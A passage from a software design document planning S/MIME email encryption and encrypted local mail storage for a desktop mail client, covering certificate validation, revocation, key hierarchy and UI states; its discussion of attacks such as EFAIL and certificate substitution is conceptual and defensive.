  with*; that bug is documented and real.
- **An unreadable store is never licence to delete or re-key.** `remember_secret`'s
  existing guard covers it.
- A failed write surfaces as `{ saved, save_error }`, never `let _ = set(...)`.
- **No keychain read on any launch path.** Mail unlock happens on first mailbox
  *use*, never at startup — launch paths promise not to prompt, and that promise
  is load-bearing.

---

## 4. Trust and validation

### 4.1 `rustls-platform-verifier` cannot be reused, and this needs saying loudly

It is already a dependency, it is named "platform verifier", and it will be the
first thing anyone reaches for. It is the wrong tool:

- Its API is `rustls::client::danger::ServerCertVerifier::verify_server_cert(
  end_entity, intermediates, server_name: &ServerName, ocsp, now)`. **There is no
  call shape that does not take a server name.**
- On Windows it calls `CertGetCertificateChain` with `CERT_CHAIN_POLICY_SSL`; on
  macOS it evaluates against `SecPolicyCreateSSL`. Both are **TLS server-auth
  policies**: an `emailProtection`-only certificate fails them, and anything that
  passes them passed for the wrong reason.
- Feeding it a fabricated `ServerName` derived from an email domain would be a
  verifier that answers a question we did not ask — the single worst kind of
  security code, because it returns `Ok`.

**Use `rustls-webpki` directly (§2.4) with `KeyUsage::required(EMAIL_PROTECTION)`.**
A comment must say why the obvious crate was not used, or it will be "simplified"
back in six months.

### 4.2 Which root store

`services/mail_trust.rs`, `fn anchors() -> &'static [TrustAnchor<'static>]`,
built once into a `OnceLock`:

1. **The OS trust store**, via `rustls-native-certs` (already in the tree under
   `reqwest`), converted with `webpki::anchor_from_trusted_cert`.
2. **Plus** a user-managed extra-roots directory,
   `<state_dir>/mail/certs/roots/*.der`, populated by an explicit
   `mail_trust_root_import` through the OS open dialog. This is the escape hatch
   for an institutional CA that is *not* in the OS store — offered instead of an
   "accept any certificate" checkbox, exactly as the TLS side does it.

Disclosed limitations, in the module header rather than glossed:

- **The OS TLS root set is not the OS S/MIME root set.** Windows keeps one ROOT
  store with per-purpose trust settings (a Certificate Trust List); macOS keeps
  per-policy trust settings in the Keychain. Reading the flat list ignores those
  settings, so a root the OS trusts *only for code signing* is accepted here for
  email. That is a real over-trust, it is what every cross-platform pure-Rust
  client does, and the `emailProtection` EKU requirement on the leaf is the
  partial compensation. If it ever matters, the fix is per-platform trust-setting
  queries, i.e. §3.3's rejected path.
- Linux has no OS store at all; `rustls-native-certs` reads the distro CA bundle
  (`/etc/ssl/certs`), which is TLS-shaped for the same reason.

### 4.3 What is checked, and by whom

| Check | Who |
|---|---|
| Chain signatures, validity windows, `basicConstraints`, `pathLen`, name constraints | `webpki::verify_for_usage` |
| EKU contains `id-kp-emailProtection` (1.3.6.1.5.5.7.3.4) | `webpki::KeyUsage::required(…)` |
| `keyUsage` bit appropriate to the operation (`digitalSignature` to verify, `keyEncipherment`/`keyAgreement` to encrypt to) | ours, over `x509-cert::ext` |
| **`rfc822Name` SAN (or legacy `emailAddress` RDN) matches the visible `From:`** | **ours** — `mail_trust::rfc822_matches`, pure, ~50 LOC, exhaustively table-tested |
| Signature over `signedAttrs`, and `messageDigest` vs. the content digest | ours — `mail_smime::verify_signed` |
| Revocation | §4.4 |
| Chain time base | **Now**, not the claimed signing time. `signingTime` is a *signed attribute the signer chose* and using it to decide validity lets an attacker with a stolen expired key backdate forever. The panel shows the claimed signing time as information and marks it when it disagrees with the `Date:` header. |

### 4.4 Revocation, and why a network check is refused by default

**No OCSP, ever. No automatic CRL fetch. Revocation state defaults to
`not_checked` and the UI says `not_checked`, never a tick.**

The argument is not "network calls are slow", it is that an automatic revocation
check is **the exfiltration channel this client spent plan B removing**:

- The CRL distribution point / OCSP responder URL comes **out of a certificate
  that arrived in a message**, i.e. it is attacker-chosen. Auto-fetching it is
  an SSRF (T20) and a per-message beacon (T2) with the reader's IP, keyed to the
  attacker's URL. It is a tracking pixel wearing a PKI costume.
- Even with an honest CA it tells that CA *"this user is reading a message signed
  by this certificate, right now"* — a correspondence side channel in a client
  whose webview cannot load a 1×1 GIF on purpose.

What is offered instead:

- `mail_crl_import` — an explicit, offline CRL import into
  `<state_dir>/mail/certs/crl/`, fed to `webpki::RevocationOptions`. This is how
  an enterprise actually distributes CRLs anyway.
- A per-certificate **"Check revocation now"** button, one click, one
  certificate, routed through `services/browser_engine.rs`'s already-hardened
  fetch (SSRF hop checks, address pinning, redirect cap, no cookies, no
  `Referer`, fixed UA, size and time caps). Never automatic, never batched.
- `RevocationOptions` is configured to **fail closed on a stale CRL** for a
  certificate whose CRL we do hold, and to report `not_checked` for one we do not
  — the two states are different and are shown differently.

### 4.5 What the UI shows for each outcome

`MailCryptoPanel`, above the message frame, outside the iframe, rendered
**only** from the typed `MailCryptoStatus` (§7.3). Green is expensive:

| Outcome | Tone | Wording |
|---|---|---|
| valid ∧ trusted chain ∧ `From` matches | **good** | *"Signed by `name <addr>`"* + issuer + fingerprint on expand |
| valid ∧ trusted ∧ `From` **mismatch** | **bad** | *"Signed by `other@evil.example` — but this message claims to be from `bank.example`"* — both spelled out, exactly `MailAuthPanel`'s unaligned-DKIM rule |
| valid signature ∧ **unknown CA** | **warn** | *"Signature is intact, but the issuer is not trusted on this machine"* + an Import-root affordance |
| valid ∧ chain **expired** | **warn** | *"…the certificate expired on `date`"* |
| valid ∧ **revoked** | **bad** | *"…the certificate has been revoked"* |
| valid ∧ revocation `not_checked` | **neutral** sub-line under a good/warn head | *"Revocation was not checked."* Stated, never implied. |
| signature **invalid** | **bad** | *"The signature does not match this message."* |
| signature covers **part** of the message | **bad** | *"Only part of this message is signed."* — a distinct state, never `valid`. §7.4. |
| signature **outside** the encryption | **bad** | *"This message was signed after it was encrypted, which does not prove who wrote it."* §8.3. |
| no crypto at all | *nothing rendered* | Absence is not failure — `MailAuthPanel`'s rule. |
| decryption failed | **bad**, single state | *"This message could not be decrypted."* §11.3. |
| encrypted, no matching identity | **neutral** | *"Encrypted for a certificate this app does not hold."* |

Every one of these carries `<UntestedTag />` on the panel head until the user
confirms live QA, matching `MailAuthPanel`'s current treatment.

---

## 5. Recipient certificate discovery

### 5.1 Recommended default: harvest from signed mail + manual import. Nothing else.

**Harvesting** is free and is how S/MIME has always worked: every `SignedData`
carries the signer's certificate and usually its chain. On a successful *parse*
(not necessarily a successful *verification*), the certificates are recorded in
`<state_dir>/mail/certs/peers/` and indexed in a new `peer_certs` table keyed by
`(rfc822_name, sha256_fingerprint)`.

Three rules make harvesting safe, and they are the whole design:

1. **A harvested certificate is data, never trust.** It is stored, and it is
   validated on *use*, every time. Storage is not endorsement.
2. **First contact is recorded; a change is a question.** If a *different*
   certificate appears for an address that already has one, the mail is not
   silently verified against the new one. A **certificate-change confirmation**
   is raised naming both fingerprints, both issuers and both validity windows —
   the same shape and the same component family as the existing SSH
   `HostKeyConfirmDialog`, for the same reason. Silent replacement is the
   certificate-substitution attack (§11.5), and it is the one attack a harvesting
   client is uniquely exposed to.
   *(Exception that must be handled or the dialog becomes noise: a legitimate
   renewal by the same issuer with the same subject key. It is still shown, but
   toned as a renewal and one click to accept.)*
3. **`certs-only` messages are never auto-imported.** `application/pkcs7-mime;
   smime-type=certs-only` is displayed as *"This message contains certificates"*
   with an explicit import button, because auto-import is substitution with the
   attacker driving.

**Manual import** — `.cer`/`.pem`/`.der`/`.p7c` for a correspondent, through the
backend-raised OS open dialog. Same path-free rule.

### 5.2 LDAP / directory lookup: not in v1, and if ever, generic

Common at institutions, and genuinely useful — and still deferred:

- It is a **new network protocol** with its own auth surface, its own
  untrusted-input parser, and its own credential in the keychain, for a
  convenience feature. Plan B rejected CardDAV for exactly this shape of reason.
- A lookup per recipient is an **outbound beacon keyed to who you are writing
  to**, fired as you type. If it is ever built it must be an explicit *button*,
  never an as-you-type query.
- **No presets, ever.** The repo rule (`feedback_no_institution_hostnames`) is
  absolute: no institution or lab hostname, no directory URL, no base-DN template
  ships in this public repository. A user types their own host, port, base DN and
  bind mode, or the feature does not exist. Any example in code, tests or docs is
  `ldaps://directory.example.com` / `ou=people,dc=example,dc=com`.

Also named and **rejected**: fetching a certificate from a URL found in a
message (SSRF + tracker + substitution, all three at once); and public keyservers
in the OpenPGP track (§12).

---

## 6. Per-account configuration

### 6.1 Schema

`schema/mail.rs`, additive, riding the existing `#[serde(flatten)] extra`
catch-all so an older build round-trips a newer file. `src/types/mail.ts` is the
**frozen contract** and must be updated in the same commit, in snake_case, with
the same optionality — `schema/mail.rs`'s existing round-trip tests are extended
rather than replaced, and the `authserv_id`-was-swallowed-by-the-catch-all test
is the template (that bug was found in live QA and will recur here).

```rust
/// Per-account end-to-end encryption. Absent on every account until the user
/// configures one, and `MailCrypto::default()` is "off for everything" —
/// a field a future build adds must never turn cryptography on by inheritance.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
pub struct MailCrypto {
    /// Master switch for this account. Default false.
    #[serde(default)]
    pub enabled: bool,
    /// Which imported identity signs and decrypts for this account. `None`
    /// means "verify and decrypt nothing, sign nothing" even when `enabled`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub identity_id: Option<String>,
    /// Default false. Signing every message publishes your certificate to every
    /// recipient — that is *how* discovery works (§5.1), and it is therefore
    /// also a linkability decision the user should make deliberately.
    #[serde(default)]
    pub sign_by_default: bool,
    /// Default false. On, every send to a recipient without a certificate is a
    /// blocked send (§8.2), which as a default is a nag rather than a feature.
    #[serde(default)]
    pub encrypt_by_default: bool,
    /// **Default TRUE**, and the only default in this struct that is on.
    /// Replying in cleartext to an encrypted message quotes the decrypted
    /// plaintext back across the wire — the most common real-world way
    /// end-to-end encryption is defeated, and it is defeated by the *recipient*.
    #[serde(default = "crate::schema::mail::default_true")]
    pub encrypt_reply_to_encrypted: bool,
    /// Secondary track (§12). Independent of `enabled`: an account may do
    /// OpenPGP, S/MIME, both, or neither.
    #[serde(default)]
    pub openpgp_enabled: bool,
}
```

`MailAccount` gains `#[serde(default, skip_serializing_if = "Option::is_none")]
pub crypto: Option<MailCrypto>`.

`schema/settings.rs` gains the **machine-level** knobs, which are not per-account
because they are properties of this installation's disk and trust store:
`mail_store_encrypted: bool`, `mail_store_key_in_keychain: bool` (default false),
`mail_crypto_render_html: bool` (default **false** — §11.2).

### 6.2 `MailAccountDialog`

A new **Security** section below the `authserv_id` field, which is its natural
neighbour: both answer "how much do I believe this message". It follows the
existing field idiom (`.mail-field` / `.mail-field-label` / `.mail-field-hint`)
and the existing tagging discipline — the dialog title already carries an
`<UntestedTag />`, and the file already documents at line ~359 why a second one
is not added per field, so the **section head** gets one and individual rows do
not.

Rows: an identity picker (populated from `mail_identity_list()`, with an *Import
certificate…* item that opens `MailIdentityDialog`), Sign by default, Encrypt by
default, Encrypt replies to encrypted mail (on), and — when an identity is
selected — a read-only summary line showing subject, `rfc822Name`s, issuer,
validity and the SHA-256 fingerprint in groups of four.

The fingerprint is shown because it is the only thing a user can compare out of
band, and it is rendered as a **plain text node in a monospace class**, like
every other mail-derived string.

---

## 7. Receiving

### 7.1 Where the crypto layer sits

**One seam, in `services/mail_engine.rs`, between `parse_bounded` and the body
pick.** Not in `commands/mail.rs` (which would put crypto above the caps), not in
`mail_sanitize` (which would put it after the sanitizer), and not in the frontend
(which would put ciphertext in the webview).

```
IMAP FETCH (TLS)
  └─ raw RFC 5322 bytes                       [untrusted]
      └─ scan_headers / parse_bounded          ← EXISTING caps, unchanged
          └─ mail_smime::classify(&msg)        ← NEW: what kind of crypto, if any
              ├─ Enveloped   → mail_smime::open_enveloped()
              │                   └─ inner bytes RE-ENTER AT THE TOP
              │                      (parse_bounded again, same caps,
              │                       depth += 1, refuse above MAX_CRYPTO_DEPTH)
              ├─ Signed(detached | opaque)
              │              → mail_smime::verify_signed()
              │                   └─ mail_trust::validate()  [webpki]
              ├─ CertsOnly   → surfaced, never imported
              ├─ Compressed  → REFUSED (decompression-bomb channel, T10)
              └─ None        → unchanged path
          └─ pick body part                    ← EXISTING
              └─ ammonia sanitize              ← EXISTING, byte-for-byte unchanged
                  └─ MailBody { …, crypto: MailCryptoStatus }
                      └─ IPC ───────── the boundary ─────────
                          └─ srcdoc, <iframe sandbox="">      ← EXISTING
```

**The ordering is mandatory and the reason is one sentence: the decrypted
plaintext is *more* attacker-controlled than the outer message, not less — it
came off the same socket.** There is no "trusted because it was encrypted"
branch anywhere. It re-enters the pipeline at the top, under the same
`MAX_MESSAGE_BYTES` / `MAX_MIME_DEPTH` / `MAX_MIME_PARTS` / `MAX_HEADER_LINE`
caps, and it gets the same `ammonia` pass. A separate, laxer path for decrypted
content would be the whole bug.

Two new caps:

- `MAX_CRYPTO_DEPTH = 3` — enough for triple-wrapping (sign→encrypt→sign), which
  we must *read* even though we do not *write* it (§8.3). A fourth layer is
  refused. Without this, 500 nested `EnvelopedData`s are 500 RSA private-key
  operations from one message.
- `MAX_DECRYPTED_BYTES = MAX_MESSAGE_BYTES` — the decrypted size is capped
  independently of the ciphertext size.
- **At most one enveloped part per message.** A message carrying two is refused.
  This is not tidiness: the EFAIL direct-exfiltration gadget works by getting the
  client to *concatenate* the results of several decryptions into one rendered
  document (§11.1).

### 7.2 Content types

| Type | Handling |
|---|---|
| `application/pkcs7-mime; smime-type=enveloped-data` (+ `x-pkcs7`) | decrypt |
| `application/pkcs7-mime; smime-type=signed-data` (opaque) | verify, then render the encapsulated content |
| `application/pkcs7-mime; smime-type=authEnveloped-data` (RFC 5084, AES-GCM) | **refused with a named reason** — `cms 0.2.3` cannot represent it (§2.3). A silent fallback to "no crypto" would render an empty frame; a wrong-looking parse would be worse. |
| `application/pkcs7-mime; smime-type=certs-only` | surfaced, never imported (§5.1) |
| `application/pkcs7-mime; smime-type=compressed-data` (RFC 3274) | **refused.** The only compression channel a sender controls, and the reason IMAP `COMPRESS=DEFLATE` is off (T10). |
| `multipart/signed; protocol="application/pkcs7-signature"` + `.p7s` part | verify detached, over the **exact CRLF-canonicalized bytes** of the signed part including its headers |
| missing/garbled `smime-type` parameter | fall back to sniffing the CMS `contentType` OID from the DER — the parameter is sender-controlled text and several real senders get it wrong |
| OpenPGP MIME types | §12 |

### 7.3 The wire type

```rust
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MailCryptoStatus {
    pub encryption: MailEncryptionState,   // none | decrypted | failed | not_for_me | unsupported
    pub signature: MailSignatureState,     // none | valid | invalid | partial | outside_encryption | unverifiable
    pub trust: MailTrustState,             // n/a | trusted | unknown_ca | expired | revoked | bad_usage | not_checked
    pub revocation: MailRevocationState,   // not_checked | ok | revoked | stale
    #[serde(skip_serializing_if = "Option::is_none")]
    pub signer: Option<MailSigner>,        // subject, rfc822_names, issuer, fingerprint, validity, key_alg
    #[serde(skip_serializing_if = "Option::is_none")]
    pub from_match: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub protected_headers: Option<bool>,
    /// The content-encryption algorithm actually used, as a closed token —
    /// so the panel can say "unauthenticated cipher" for CBC (§11.2).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub content_alg: Option<String>,
}
```

Every field is a **closed enum serialized to a lowercase token**, exactly like
`MailAuthState`/`MailAuthVerdict`, and every one has an `Unknown`-shaped fallback
that degrades to "we don't know" and never to a pass. `MailSigner`'s free-text
fields go through `strip_controls` in the backend and land in React as plain text
nodes.

### 7.4 The partial-signature rule

The most under-implemented detail in S/MIME, and a real spoofing vector: a
`multipart/mixed` whose *second* part is a `multipart/signed` renders in several
clients as "this message is signed", while the attacker fully controls parts one
and three.

**Rule: `signature: valid` is reachable only when the signed part is the entire
message body.** Anything else is `signature: partial`, toned as bad, and the
panel names which region was covered. There is no configuration for this.

The corollary matters too: in ordinary S/MIME the `Subject:` header lives
**outside** the signature. When the signed part does not carry protected headers
(RFC 8551 §3.1 / the "memoryhole" convention), the panel says so —
*"the subject line is not covered by the signature"* — because a signed body
under an attacker-chosen subject is the cheapest possible spoof and every client
that shows one green tick over both is lying.

### 7.5 Where the decrypted body may be cached

**A named invariant with a test, not a convention:**

> `bodies_cache` is written for a message whose `crypto.encryption != none`
> **only when `meta.encryption_version >= 1`**, i.e. only when the local store is
> encrypted (§10). Otherwise nothing is cached and the body is decrypted per
> view.

One `if` in `commands::mail::mail_body`, and it is what stops "we shipped S/MIME"
from meaning "we now write your decrypted mail into a plaintext SQLite file".
See §10.7 for the policy behind it.

`bodies_cache` also gains a `crypto_version INTEGER` column beside the existing
`version`, invalidated wholesale on a bump, so a crypto fix retroactively
re-protects already-decrypted mail exactly as `SANITIZER_VERSION` does for the
sanitizer.

---

## 8. Sending

### 8.1 The flow

`MailComposeDialog` gains two toggles — **Sign** and **Encrypt** — whose initial
state is `account.crypto.sign_by_default` / `encrypt_by_default`, overridden to
**on** for Encrypt when replying to a message whose `crypto.encryption ==
decrypted` and `encrypt_reply_to_encrypted` is set (§6.1).

Per recipient, a chip resolved as the address is entered:

| Chip | Meaning |
|---|---|
| ✓ | a certificate is held, unexpired, `emailProtection`, chain-valid, `keyEncipherment`/`keyAgreement` |
| ! | a certificate is held but is expired / untrusted / wrong usage — with which |
| — | no certificate |

The chips are also the discovery UI: they are where "Import certificate…"
appears for a recipient who has none.

### 8.2 Missing recipient certificate: **block**

If Encrypt is on and any recipient has no usable certificate, **Send is disabled**
and names the recipients.

Both alternatives are worse and should be rejected explicitly, because both are
what most clients do:

- **Silently send in plaintext** — the single worst possible failure of a crypto
  feature. The user watched a padlock and got a postcard. Never.
- **"Send unencrypted anyway?"** — trains the click-through, and the dialog will
  be dismissed reflexively within a week.

The escape hatch is to **turn Encrypt off**, which is an explicit act that
visibly changes the composer's chrome (the header strip, the Send button label).
The user is never confused about which one they sent.

### 8.3 Order of operations: sign, then encrypt. No triple-wrapping.

**Sign-then-encrypt** (`SignedData` inside `EnvelopedData`) — the interoperable
default and what Outlook and Thunderbird produce.

**Encrypt-then-sign is wrong and is refused in both directions.** A signature
over ciphertext proves only that *someone forwarded these bytes*: the signature
can be stripped and replaced, and a recipient can re-encrypt the same signed
payload to a third party where it still verifies as the original sender's. We
never produce it, and when we *receive* it the status is
`signature: outside_encryption`, toned as bad (§4.5), rather than a green tick.

**Triple-wrapping (sign → encrypt → sign, RFC 8551 §3.9 / RFC 2634) is read but
not written.** The outer signature exists for gateway policy attributes and
signed receipts, neither of which this client has; it doubles the private-key
operations and the code paths for no property a user can see. We *parse* it
(hence `MAX_CRYPTO_DEPTH = 3`) so mail from an environment that uses it is not
mysterious.

### 8.4 Attachments, and the seam that makes this cheap

`build_outgoing` already returns the complete RFC 5322 entity as `Vec<u8>`, with
attachments, `Bcc` correctly kept out of the headers, and every header-injection
check applied. The crypto layer takes those bytes and returns new bytes:

```rust
let raw = mail_engine::build_outgoing(...)?;                  // UNCHANGED
let raw = match (sign, encrypt) {
    (true,  _)     => mail_smime::sign(raw, &identity)?,      // SignedData
    _              => raw,
};
let raw = if encrypt { mail_smime::envelop(raw, &recipient_certs, &self_cert)? }
          else       { raw };
InProcessEngine.send(&account, &pw, &account.address, &recipients, &raw).await
```

**Attachments are inside the encryption by construction** — nothing
attachment-specific is written. Every existing `build_outgoing` test stays valid,
which is the point of putting the seam here.

Algorithms, chosen for interop rather than for the spec's newest option:
SHA-256 digests, RSA-PKCS1-v1.5 or ECDSA signatures per the identity's key,
**AES-256-CBC** content encryption, RSAES-PKCS1-v1_5 or ECDH+AES-KW key
transport. AES-GCM enveloping is not produced (§7.2).

### 8.5 The Sent copy — currently a non-problem, and it must stay solved

**There is no IMAP `APPEND` anywhere in `services/mail_engine.rs` today.**
`mail_draft_send` sends over SMTP and deletes the draft; **no Sent copy is stored
at all.** That is, accidentally, the most private behaviour available, and it is
why "Sent copies" is a separate, *later* phase (Phase 6) rather than part of
Phase 5.

When `APPEND` is added, the rules are:

- The Sent copy is the **encrypted** message, with the sender's own certificate
  added as an additional `RecipientInfo` (encrypt-to-self — universal practice,
  and the only way to read your own Sent mail).
- If the account has an identity, encrypt-to-self is **not optional**.
- If the account has **no** identity and the message was encrypted, **no Sent
  copy is stored**. A plaintext copy of an encrypted message, sitting in an IMAP
  folder the provider can read, defeats the entire feature — and it is exactly
  what several mainstream clients do.
- Doing Phase 6 before Phase 5 would create that plaintext copy, which is why
  the order is fixed.

### 8.6 Drafts

`MailStore::save_draft` writes the draft as plaintext JSON into SQLite today, so
an encrypted-intent message is plaintext at rest for as long as it is being
written — usually the longest a message ever sits on disk.

Two options and the choice is easy:

- **(a) Do not autosave a draft with Encrypt on.** Rejected. This repository has
  a documented allergy to features that lose authored work (TODO Group V
  #93/#94: *"both lose authored work with no prompt"*).
- **(b) Encrypt drafts at rest under the store key.** Free once §10 exists, since
  `drafts.json` is on §10.4's sealed-column list anyway.

**Recommend (b)** — and note that this is a second, independent argument for
sequencing §10 as Phase 1.

---

## 9. Search and index implications

Encrypted bodies are opaque to the local store, and today's search is a SQL
`LIKE` over three columns:

```sql
WHERE folder_id = ?1 AND deleted = 0
  AND (subject LIKE ?2 ESCAPE '\' OR from_json LIKE ?2 ESCAPE '\'
       OR preview LIKE ?2 ESCAPE '\')
```

(`MailStore::headers_page`.) The behaviour, stated rather than discovered:

- **An encrypted message that has never been opened is not searchable at all.**
  Its `subject` *is* searchable — S/MIME leaves the subject header in the clear —
  but its body has never existed locally. `preview` for such a message is a
  **fixed literal** ("Encrypted message"), never a snippet of base64, and the
  message list shows a lock glyph in place of the preview text.
- **An opened message is searchable only if it was cached**, which per §7.5
  happens only when the store is encrypted. So on a plaintext store, encrypted
  mail is permanently unsearchable; on an encrypted store it becomes searchable
  once read. That is a defensible, explainable rule and the search box says so
  when a folder contains encrypted mail and the query found nothing.
- **Server-side search can never see inside an encrypted body.** IMAP `SEARCH`
  runs on the server, which holds ciphertext. This is a fact about end-to-end
  encryption, not a limitation Eldrun introduced, and the UI should say it in
  those words rather than apologising for it.
- Once §10 lands, `subject`/`preview`/`from_json` are themselves sealed, so
  `LIKE` stops working for **all** mail — see §10.5, which replaces it with a
  bounded decrypt-on-scan.

---

## 10. The local mail store at rest

*A distinct problem from §§2–9, applying to all cached mail whether or not any of
it is end-to-end encrypted. This section supersedes `docs/mail_client_plan_b.md`
§5.2's "deliberately none in v1" — but it keeps §5.2's core objection intact
(§10.6), because that objection was right and is what makes the design different
from a naïve one.*

### 10.1 What is on disk today, and which of it is sensitive

Verified against `services/mail_store.rs` and `commands/mail.rs::mail_dir()`:

```
~/.local/share/eldrun/mail/                    0700
├── accounts.json                              your addresses + providers, no secret
├── mail.db                                    0600, SQLite, journal_mode = WAL
│   ├── folders      id, account, path, name, kind, unread, total
│   ├── messages     subject, from_json, to_json, cc_json, date, flags, size,
│   │                PREVIEW (240 chars of body), malformed, rfc_message_id,
│   │                authres_json, priority
│   ├── bodies_cache html (the sanitized body), text (the FULL plain body),
│   │                links_json, remote_refs, truncated, raw_blob
│   ├── attachments  filename, mime, size, inline, mismatch, blob digest
│   ├── drafts       json — the entire unsent message
│   ├── staged       picked-attachment metadata
│   └── mail_remote_allow
├── mail.db-wal, mail.db-shm                   ← plaintext copy of recent writes
├── blobs/<sha256>                             0600 — decoded attachment payloads
│                                                AND whole raw RFC 5322 messages
│                                                over INLINE_BODY_LIMIT (256 KB)
└── outbox/<draft>/<staged>                    0600 — copies of files you attached
```

Sensitivity: **essentially all of it.** `bodies_cache.text` is the full body of
every message ever opened. `blobs/` is attachments and whole raw messages
verbatim. `drafts` is unsent mail. `preview` is 240 characters of body for every
message ever synced, including ones never opened. And `messages`' address columns
plus `date` are a **correspondence graph**, which is arguably more sensitive than
any single body.

Two things that are easy to miss and are exactly where a naïve encryption design
leaks:

- **The WAL.** `journal_mode = WAL` is set in `MailStore::open`. `mail.db-wal` is
  a plaintext copy of recent writes that survives a crash and is not covered by
  anything done to `mail.db` itself.
- **Freed pages.** Deleting a row does not erase its bytes; `clear_cached_mail`
  and `delete_account_mail` leave the content in free pages until they are
  reused.

### 10.2 What is rejected, and why (these are the first three things anyone proposes)

**SQLCipher.** `rusqlite`'s `sqlcipher` feature links a **system** SQLCipher,
which is itself built against OpenSSL (or LibTomCrypt) — so it reintroduces the
exact dependency §2.1 exists to keep out, on all three platforms, and it is
mutually exclusive with the `bundled` feature this repo already uses
(`rusqlite = { version = "0.40.1", features = ["bundled"] }`). It would also mean
shipping a second SQLite build. **Rejected.**

**Whole-file encryption of `mail.db`** (decrypt on open, re-encrypt on close).
Kills incremental sync, needs the whole mailbox resident, and a crash either
loses everything or writes a plaintext temporary — the failure mode is worse than
the threat.

**Per-blob encryption only.** Leaves the SQLite index — subjects, addresses,
previews, drafts — in the clear. That index is the metadata that matters most.

### 10.3 Recommended: field-level AEAD inside SQLite + whole-file AEAD for blobs, one key hierarchy

One sealing primitive, one envelope shape, one version byte, in a new
`services/mail_crypt.rs`:

```rust
/// [ b"ELMC" | u8 version | u8 alg | [u8; 24] nonce | ciphertext‖tag ]
pub fn seal(key: &Key, aad: &[u8], plaintext: &[u8]) -> Vec<u8>;
pub fn open(key: &Key, aad: &[u8], sealed: &[u8]) -> Result<Zeroizing<Vec<u8>>, CryptError>;
```

- **Primitive: XChaCha20-Poly1305** (`chacha20poly1305 0.11`). Over AES-256-GCM
  for one specific reason: the **192-bit random nonce** makes reuse a non-problem
  under plain `OsRng`, where GCM's 96-bit nonce wants a counter that must survive
  a crash *and* a restore-from-backup — and a restored counter is precisely how
  GCM nonce reuse happens in the field. Pure Rust, no OpenSSL, and no reliance on
  AES-NI being present on whatever the user runs. The `alg` byte and the single
  `seal`/`open` pair keep `aes-gcm` a swap rather than a rewrite if a hardware-AES
  argument ever wins.
- **AAD binds each record to its identity.** For a SQLite field:
  `AAD = account_id ‖ 0x00 ‖ table ‖ 0x00 ‖ column ‖ 0x00 ‖ row_key`. For a blob:
  `AAD = blob_id`. Without this, someone with disk access can **move the
  ciphertext of message A's body onto message B's row** and the client renders it
  as B — no key needed. That record-swap is the difference between "encrypted"
  and "encrypted correctly", it costs one string concatenation, and it is the
  first thing to test (§14).

### 10.4 What is sealed and what is not — and the leak, stated

**Sealed:** `messages.{subject, from_json, to_json, cc_json, preview,
rfc_message_id, authres_json}`; `bodies_cache.{html, text, links_json}`;
`attachments.filename`; `drafts.json`; `folders.{path, name}`; every file under
`blobs/` and `outbox/`.

**Deliberately plaintext:** `id`, `account_id`, `folder_id`, `uid`, `date`,
`seen`, `flagged`, `answered`, `deleted`, `has_attachments`, `size`, `priority`,
the blob reference, and every index.

Why: these are what `ORDER BY date DESC, uid DESC`, the unread counts, the
priority page and the pagination run on (`MailStore::order_clause`,
`refresh_counts`, `priority_counts`). Sealing them means decrypting the whole
mailbox to draw one page of a hundred rows.

**The leak, stated plainly rather than buried:** an attacker with the disk learns
how many messages you have, in which folders, when each arrived, how large it
was, which are unread, which you starred and which you marked urgent. That is
real metadata. It is the price of a client that can page a folder, and anyone who
needs it hidden needs full-disk encryption — which hides the filenames too.

**One consequence that must be fixed at the same time:** blobs are content-addressed
by `SHA-256(plaintext)` today (`MailStore::hex_digest`), which is a **confirmation
oracle** — someone with the directory can test whether the mailbox contains a
specific known file. Under encryption, blob ids become
`HMAC-SHA256(blob_addr_key, plaintext)`, keeping deduplication and removing the
oracle. Small change, easy to miss, and it is the kind of thing that makes the
difference between the feature meaning something and looking like it does.

### 10.5 Search under encryption

`headers_page`'s `LIKE` cannot run over ciphertext. Replacement:

- **Decrypt-on-scan, bounded.** With no query, nothing changes: the page is
  selected and ordered by plaintext columns and only the visible rows are opened.
  With a query, scan the folder's rows in `date DESC` order, opening `subject` /
  `preview` / `from_json` per row until `limit` matches or a cap
  (`MAX_SEARCH_SCAN = 50_000` rows) is hit, then report *"searched the most
  recent N messages"* rather than silently truncating. XChaCha20 runs at
  ~1 GB/s; 50 000 subjects and previews is a few MB, i.e. milliseconds — and it
  runs in `spawn_blocking` like everything else here.
- `total` becomes the count of matches found within the scan, not a separate
  `COUNT(*)`. The pager must therefore stop claiming a page count it cannot know;
  that is a small honest UI change.
- **Rejected: a blind index** (storing `HMAC(key, token)` per word). It restores
  `LIKE`-speed search at the price of a deterministic per-token fingerprint —
  which leaks word frequency and lets an attacker with the disk test for the
  presence of any guessed word. That is most of what the encryption was for.

### 10.6 The key hierarchy, and where the unlock secret lives

```
  unlock secret ──► KEK ──(AEAD-unwraps)──► MK  (32 B, random, once per store)
   passphrase                                │
   OR keychain blob                          ├─ HKDF(MK,"eldrun/mail/db")     → field key
   (opt-in, default OFF)                     ├─ HKDF(MK,"eldrun/mail/blob")   → blob key
                                             ├─ HKDF(MK,"eldrun/mail/blobid") → blob-address key
                                             └─ HKDF(MK,"eldrun/mail/ident")  → identity-wrapping key (§3.2)
```

`<state_dir>/mail/keyring.json` (0600) holds
`{ version, kdf: { alg: "argon2id", m, t, p, salt }, wrapped_mk, check }`.
Nothing in it is a secret without the unlock secret; the `check` value is an
AEAD over a fixed string, so a wrong passphrase is detected in constant work
rather than by a mailbox full of garbage.

**Two unlock sources, and the choice is the user's:**

- **Passphrase — the default.** Argon2id, parameters recorded in the file so they
  can be raised later without stranding an existing store. Prompted on **first
  mailbox use in a session, never on a launch path** — the existing promise that
  launch paths do not prompt is load-bearing and applies verbatim.
- **OS keychain — opt-in, default OFF.** A random 32-byte KEK under
  `remote_credentials` at `mail:store-key`. This buys, free and already tested:
  the 4 s `read_timed` bound, `cached_keyring_state()`'s refusal to dispatch into
  a locked collection, the keyutils cache that makes every read after the first
  per boot a non-blocking kernel lookup, and `remember_secret`'s guard. Every
  rule in §3.4 applies, especially: **a locked collection renders as "Keyring
  locked — unlock to read your local mail", never as an empty mailbox**, and the
  remember flag is `true | null`, never `false`.

This is where `docs/mail_client_plan_b.md` §5.2's objection is honoured rather
than overruled. §5.2 said: *"Making the entire mailbox unreadable when the
keychain is locked is a strictly worse user-facing failure than an unencrypted
cache."* Correct — so the keychain is the **opt-in** path, the passphrase is the
